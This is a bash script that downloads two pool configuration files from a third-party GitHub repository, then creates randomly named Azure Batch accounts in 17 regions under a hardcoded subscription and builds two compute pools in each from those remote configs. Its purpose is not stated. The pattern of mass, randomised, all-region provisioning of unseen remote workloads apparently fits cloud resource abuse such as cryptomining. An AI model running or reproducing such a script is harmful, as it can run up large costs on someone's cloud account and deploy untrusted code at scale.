#!/bin/bash
sub="d3ae9831-e52d-4229-bf58-4f1250b87091"
ran=`head /dev/urandom | tr -dc a-z0-9 | fold -w 3 | head -n 1`
wget -O batch.json https://raw.githubusercontent.com/winttr89/batch1/main/batch.json
wget -O batch2.json https://raw.githubusercontent.com/winttr89/batch1/main/batch2.json
az group create --name batchacc$ran --location westus2 --subscription "$sub"
nnn=`head /dev/urandom | tr -dc a-z0-9 | fold -w 14 | head -n 1`
batch=0
for region in switzerlandnorth southeastasia eastus eastus2 westus westus2 centralus southcentralus northeurope westeurope japaneast australiaeast centralindia canadacentral uksouth koreacentral francecentral
do
	echo "Batch account creating...$region"
	batch=$(( $batch + 1 ))
	az batch account create --subscription "$sub" --name a$batch$nnn --resource-group batchacc$ran --location $region --no-wait
done
echo "Sleep 7m..."
sleep 7m
batch=0
echo "Batch account setting..."
for region in switzerlandnorth southeastasia eastus eastus2 westus westus2 centralus southcentralus northeurope westeurope japaneast australiaeast centralindia canadacentral uksouth koreacentral francecentral
do
	batch=$(( $batch + 1 ))
	az batch account login --subscription "$sub" --name a$batch$nnn --resource-group batchacc$ran --shared-key-auth
	az batch pool create --subscription "$sub" --account-name a$batch$nnn --json-file ./batch.json
	az batch pool create --subscription "$sub" --account-name a$batch$nnn --json-file ./batch2.json
done
echo "Xong..."
